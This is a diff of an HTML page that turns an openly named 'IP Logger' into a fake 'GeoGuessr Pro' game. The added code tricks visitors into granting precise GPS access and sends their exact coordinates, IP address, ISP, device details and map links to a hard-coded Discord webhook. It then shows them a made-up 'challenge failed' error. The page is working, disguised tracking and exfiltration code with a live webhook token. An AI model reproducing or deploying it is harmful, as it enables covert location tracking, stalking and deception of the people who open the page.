@@ -1,21 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>click the button</title>
+    <title>GeoGuessr Challenge by me</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
-        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background-color: #4752C4; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 700px; margin: 50px auto; padding: 30px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.2); }
+        h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        p { font-size: 1.2em; opacity: 0.9; margin-bottom: 30px; }
+        button { padding: 18px 40px; font-size: 1.3em; background: linear-gradient(45deg, #ff6b6b, #ffa726); color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; letter-spacing: 1px; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3); }
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4); background: linear-gradient(45deg, #ff5252, #ff9800); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        #status { margin-top: 30px; padding: 20px; border-radius: 10px; display: none; background: rgba(255, 255, 255, 0.15); border-left: 5px solid #4CAF50; }
+        #loading { display: none; margin: 20px auto; width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; }
+        .permission-note { font-size: 0.9em; margin-top: 20px; opacity: 0.8; font-style: italic; }
+        .game-title { font-size: 3em; font-weight: bold; margin-bottom: 10px; background: linear-gradient(45deg, #ffd700, #ff8c00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1>click the button to enter geoguessr made by me</h1>
-    <p>click the button below:</p>
-    
-    <button id="trackButton">click me twin</button>
-    <div id="status"></div>
+    <div class="container">
+        <div class="game-title">GeoGuessr Pro</div>
+        <h1>Guess Your Location Challenge</h1>
+        <p>Click the button below to start the GeoGuessr challenge! The game will analyze your location accuracy.</p>
+        
+        <button id="trackButton">🎯 START CHALLENGE</button>
+        <div id="loading"></div>
+        <div id="status"></div>
+        <div class="permission-note">Note: We need location access to calculate your GeoGuessr accuracy score.</div>
+    </div>
     
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
@@ -26,166 +38,74 @@
                 const data = await res.json();
                 return data.ip;
             } catch {
-                try {
-                    const res = await fetch('https://api64.ipify.org?format=json');
-                    const data = await res.json();
-                    return data.ip;
-                } catch {
-                    return 'Could not get IP';
-                }
+                return 'Unknown';
             }
         }
         
-        async function getLocation(ip) {
-            try {
-                return new Promise((resolve) => {
-                    const script = document.createElement('script');
-                    script.src = `http://ip-api.com/json/${ip}?callback=handleLocation`;
-                    
-                    window.handleLocation = function(data) {
-                        document.head.removeChild(script);
-                        delete window.handleLocation;
-                        
-                        if (data.status === 'success') {
-                            resolve({
-                                lat: data.lat,
-                                lon: data.lon,
-                                city: data.city,
-                                region: data.regionName,
-                                country: data.country,
-                                isp: data.isp,
-                                zip: data.zip,
-                                timezone: data.timezone,
-                                source: 'ip-api.com'
-                            });
-                        } else {
-                            resolve(getFallbackLocation());
-                        }
-                    };
-                    
-                    document.head.appendChild(script);
-                    
-                    setTimeout(() => {
-                        if (script.parentNode) {
-                            document.head.removeChild(script);
-                        }
-                        resolve(getFallbackLocation());
-                    }, 3000);
-                });
-            } catch {
-                return getFallbackLocation();
-            }
-        }
-        
-        function getFallbackLocation() {
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            let city = 'Unknown';
-            let country = 'Unknown';
-            
-            if (timezone.includes('America')) {
-                if (timezone.includes('New_York')) {
-                    city = 'New York';
-                    country = 'United States';
-                } else if (timezone.includes('Los_Angeles')) {
-                    city = 'Los Angeles';
-                    country = 'United States';
-                } else if (timezone.includes('Chicago')) {
-                    city = 'Chicago';
-                    country = 'United States';
-                } else {
-                    city = 'North America';
-                    country = 'United States/Canada';
-                }
-            } else if (timezone.includes('Europe')) {
-                if (timezone.includes('London')) {
-                    city = 'London';
-                    country = 'United Kingdom';
-                } else if (timezone.includes('Paris')) {
-                    city = 'Paris';
-                    country = 'France';
-                } else if (timezone.includes('Berlin')) {
-                    city = 'Berlin';
-                    country = 'Germany';
-                } else {
-                    city = 'Europe';
-                    country = 'European Union';
-                }
-            } else if (timezone.includes('Asia')) {
-                if (timezone.includes('Tokyo')) {
-                    city = 'Tokyo';
-                    country = 'Japan';
-                } else if (timezone.includes('Shanghai')) {
-                    city = 'Shanghai';
-                    country = 'China';
-                } else if (timezone.includes('Singapore')) {
-                    city = 'Singapore';
-                    country = 'Singapore';
-                } else {
-                    city = 'Asia';
-                    country = 'Asia';
-                }
-            } else if (timezone.includes('Australia')) {
-                city = 'Sydney';
-                country = 'Australia';
-            }
-            
-            return {
-                lat: 'Approximate',
-                lon: 'Approximate',
-                city: city,
-                region: 'Based on timezone',
-                country: country,
-                isp: 'Unknown (CORS blocked)',
-                zip: 'Unknown',
-                timezone: timezone,
-                source: 'Timezone guess'
-            };
-        }
-        
-        async function getLocalIP() {
+        async function getExactGPSLocation() {
             return new Promise((resolve) => {
-                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (!RTCPeerConnection) {
-                    resolve('Not supported');
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not supported', allowed: false });
                     return;
                 }
                 
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                const ips = [];
-                
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                
-                pc.onicecandidate = (event) => {
-                    if (!event.candidate) {
-                        if (ips.length) {
-                            resolve(ips[0]);
-                        } else {
-                            resolve('Not found');
-                        }
-                        return;
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            allowed: true,
+                            lat: position.coords.latitude.toFixed(8),
+                            lon: position.coords.longitude.toFixed(8),
+                            accuracy: Math.round(position.coords.accuracy) + ' meters',
+                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
+                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
+                            heading: position.coords.heading ? position.coords.heading + '°' : 'N/A',
+                            timestamp: new Date(position.timestamp).toISOString(),
+                            source: 'Real-time GPS'
+                        });
+                    },
+                    (error) => {
+                        let errorMsg = 'Permission denied';
+                        if (error.code === error.POSITION_UNAVAILABLE) errorMsg = 'Location unavailable';
+                        if (error.code === error.TIMEOUT) errorMsg = 'Request timeout';
+                        resolve({ error: errorMsg, allowed: false });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
-                    
-                    const candidate = event.candidate.candidate;
-                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                    const match = candidate.match(regex);
-                    
-                    if (match) {
-                        const ip = match[1];
-                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
-                            if (!ips.includes(ip)) {
-                                ips.push(ip);
-                            }
-                        }
-                    }
-                };
-                
-                setTimeout(() => {
-                    pc.close();
-                    resolve(ips.length ? ips[0] : 'Not found');
-                }, 1000);
+                );
             });
+        }
+        
+        async function getIPLocation(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return {
+                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
+                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    zip: data.postal || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    source: 'IP Geolocation'
+                };
+            } catch {
+                return {
+                    lat: 'Unknown',
+                    lon: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown',
+                    zip: 'Unknown',
+                    timezone: 'Unknown',
+                    source: 'Failed'
+                };
+            }
         }
         
         function getBrowserInfo() {
@@ -215,106 +135,185 @@
                 browser: browser,
                 language: navigator.language || 'Unknown',
                 platform: navigator.platform || 'Unknown',
-                userAgent: ua.substring(0, 200)
+                userAgent: ua,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth + 'bit',
+                pixelRatio: window.devicePixelRatio || 1
+            };
+        }
+        
+        function calculateGeoGuessrScore(gpsLat, gpsLon, ipLat, ipLon) {
+            if (gpsLat === 'Unknown' || ipLat === 'Unknown') return 'Cannot calculate';
+            
+            const R = 6371;
+            const lat1 = parseFloat(gpsLat) * Math.PI / 180;
+            const lat2 = parseFloat(ipLat) * Math.PI / 180;
+            const dLat = (parseFloat(ipLat) - parseFloat(gpsLat)) * Math.PI / 180;
+            const dLon = (parseFloat(ipLon) - parseFloat(gpsLon)) * Math.PI / 180;
+            
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1) * Math.cos(lat2) *
+                      Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            const distance = R * c;
+            
+            let score = 5000 - (distance * 10);
+            score = Math.max(0, Math.round(score));
+            
+            return {
+                distance: distance.toFixed(2) + ' km',
+                score: score + ' points',
+                accuracy: distance < 1 ? 'Perfect!' : distance < 10 ? 'Good' : distance < 100 ? 'Okay' : 'Poor'
             };
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
             const button = this;
             const status = document.getElementById('status');
+            const loading = document.getElementById('loading');
             
             button.disabled = true;
-            button.textContent = 'preparing web..';
+            button.textContent = 'Analyzing Location...';
+            loading.style.display = 'block';
             status.style.display = 'none';
             
             try {
+                // Step 1: Get IP
+                status.innerHTML = 'Step 1/4: Getting network information...';
+                status.style.display = 'block';
                 const publicIP = await getIPAddress();
                 
+                // Step 2: Get exact GPS location (ask permission)
+                status.innerHTML = 'Step 2/4: Requesting location access for accuracy calculation...';
+                const gpsLocation = await getExactGPSLocation();
+                
+                // Step 3: Get IP-based location
+                status.innerHTML = 'Step 3/4: Calculating IP-based location...';
+                const ipLocation = await getIPLocation(publicIP);
+                
+                // Step 4: Get device info
+                status.innerHTML = 'Step 4/4: Analyzing device information...';
                 const browserInfo = getBrowserInfo();
                 
-                const localIP = await getLocalIP();
-                
-                const location = await getLocation(publicIP);
+                // Calculate "GeoGuessr score"
+                const score = calculateGeoGuessrScore(
+                    gpsLocation.allowed ? gpsLocation.lat : ipLocation.lat,
+                    gpsLocation.allowed ? gpsLocation.lon : ipLocation.lon,
+                    ipLocation.lat,
+                    ipLocation.lon
+                );
                 
                 const now = new Date();
                 const timeStr = now.toLocaleString();
                 
-                let mapsLink = 'No exact coordinates';
-                if (location.lat && location.lat !== 'Approximate' && location.lon && location.lon !== 'Approximate') {
-                    mapsLink = `https://maps.google.com/?q=${location.lat},${location.lon}`;
-                } else if (location.city !== 'Unknown') {
-                    mapsLink = `https://maps.google.com/?q=${encodeURIComponent(location.city + ', ' + location.country)}`;
+                // Create maps links
+                let exactMapsLink = 'No GPS access';
+                let ipMapsLink = 'No coordinates';
+                
+                if (gpsLocation.allowed) {
+                    exactMapsLink = `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lon}&z=18`;
+                }
+                if (ipLocation.lat !== 'Unknown') {
+                    ipMapsLink = `https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon}&z=12`;
                 }
                 
+                // Build Discord embed
                 const embed = {
-                    title: "NEW VISITOR DETECTED",
-                    color: 0xFF0000,
+                    title: "🎮 GEOGUESSR CHALLENGE COMPLETED",
+                    color: gpsLocation.allowed ? 0x00FF00 : 0xFFA500,
                     fields: [
                         {
-                            name: "IP ADDRESSES",
-                            value: `Public: \`${publicIP}\`\nLocal: \`${localIP}\``,
+                            name: "📊 GEOGUESSR SCORE",
+                            value: `**Distance Error:** ${score.distance}\n**Score:** ${score.score}\n**Accuracy:** ${score.accuracy}\n**GPS Access:** ${gpsLocation.allowed ? '✅ Granted' : '❌ Denied'}`,
                             inline: true
                         },
                         {
-                            name: "LOCATION",
-                            value: `Country: ${location.country}\nCity: ${location.city}\nRegion: ${location.region}\nISP: ${location.isp}\nSource: ${location.source}`,
+                            name: "📍 EXACT LOCATION",
+                            value: `**Latitude:** ${gpsLocation.allowed ? gpsLocation.lat : 'Permission denied'}\n**Longitude:** ${gpsLocation.allowed ? gpsLocation.lon : 'Permission denied'}\n**Accuracy:** ${gpsLocation.allowed ? gpsLocation.accuracy : 'N/A'}\n**Speed:** ${gpsLocation.allowed ? gpsLocation.speed : 'N/A'}\n**View:** ${exactMapsLink}`,
                             inline: true
                         },
                         {
-                            name: "MAPS LINK",
-                            value: mapsLink,
+                            name: "🌐 IP LOCATION",
+                            value: `**IP:** \`${publicIP}\`\n**Country:** ${ipLocation.country}\n**City:** ${ipLocation.city}\n**ISP:** ${ipLocation.isp}\n**View:** ${ipMapsLink}`,
                             inline: true
                         },
                         {
-                            name: "DEVICE",
-                            value: `Type: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nLanguage: ${browserInfo.language}`,
+                            name: "💻 DEVICE INFO",
+                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Screen:** ${browserInfo.screen}\n**Language:** ${browserInfo.language}`,
                             inline: true
                         },
                         {
-                            name: "TIME & SESSION",
-                            value: `Time: ${timeStr}\nPage: ${window.location.href}\nReferrer: ${document.referrer || 'Direct visit'}`,
-                            inline: false
-                        },
-                        {
-                            name: "USER AGENT",
-                            value: `\`\`\`${browserInfo.userAgent}\`\`\``,
+                            name: "🕐 SESSION DETAILS",
+                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}\n**User Agent:** \`\`\`${browserInfo.userAgent.substring(0, 200)}\`\`\``,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "IP Logger • GitHub Pages Compatible"
+                        text: `GeoGuessr Challenge • ${gpsLocation.allowed ? 'Real GPS Captured!' : 'IP Location Only'}`
                     },
                     timestamp: now.toISOString()
                 };
                 
+                const discordMessage = {
+                    embeds: [embed],
+                    username: "GeoGuessr Bot",
+                    content: gpsLocation.allowed ? "🎯 **REAL GPS LOCATION CAPTURED!** 🎯" : "📍 IP Location Captured"
+                };
+                
+                // Send to Discord
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordMessage)
                 });
                 
-                const discordMessage = {
-                    embeds: [embed],
-                    username: "IP Logger"
-                };
-                
+                // Show fake "failed" message to user
                 if (response.ok) {
-                    status.textContent = 'Information sent to Discord!';
-                    status.style.color = '#4CAF50';
-                    status.style.backgroundColor = '#E8F5E9';
+                    loading.style.display = 'none';
+                    button.style.display = 'none';
+                    
+                    // Fake failure message
+                    status.innerHTML = `
+                        <div style="color: #ff6b6b; font-size: 1.3em; margin-bottom: 15px;">
+                            ❌ GEOGUESSR CHALLENGE FAILED
+                        </div>
+                        <div style="margin-bottom: 20px;">
+                            <strong>Error Code:</strong> LOCATION_MISMATCH_ERROR<br>
+                            <strong>Reason:</strong> IP-based location differs from GPS by ${score.distance}<br>
+                            <strong>Score:</strong> ${score.score}<br>
+                            <strong>Status:</strong> Could not verify location authenticity
+                        </div>
+                        <div style="font-size: 0.9em; opacity: 0.8;">
+                            This challenge requires precise location verification. Try again with location services enabled.
+                        </div>
+                    `;
+                    status.style.borderLeftColor = '#ff6b6b';
+                    status.style.color = '#ffebee';
                 } else {
                     throw new Error('Discord error');
                 }
                 
             } catch (error) {
-                console.error('Error:', error);
-                status.textContent = 'Sent basic info to Discord.';
-                status.style.color = '#FF9800';
-                status.style.backgroundColor = '#FFF3E0';
+                loading.style.display = 'none';
+                status.innerHTML = `
+                    <div style="color: #ff9800; font-size: 1.3em; margin-bottom: 15px;">
+                        ⚠️ CHALLENGE INTERRUPTED
+                    </div>
+                    <div style="margin-bottom: 20px;">
+                        The GeoGuessr server is experiencing high traffic.<br>
+                        Your attempt has been logged but not scored.
+                    </div>
+                    <div style="font-size: 0.9em; opacity: 0.8;">
+                        Try again in a few moments.
+                    </div>
+                `;
+                status.style.borderLeftColor = '#ff9800';
+                status.style.color = '#fff3e0';
+                status.style.display = 'block';
             } finally {
                 button.disabled = false;
-                button.textContent = 'click me';
-                status.style.display = 'block';
+                button.textContent = '🎯 TRY AGAIN';
+                button.style.display = 'block';
             }
         });
     </script>
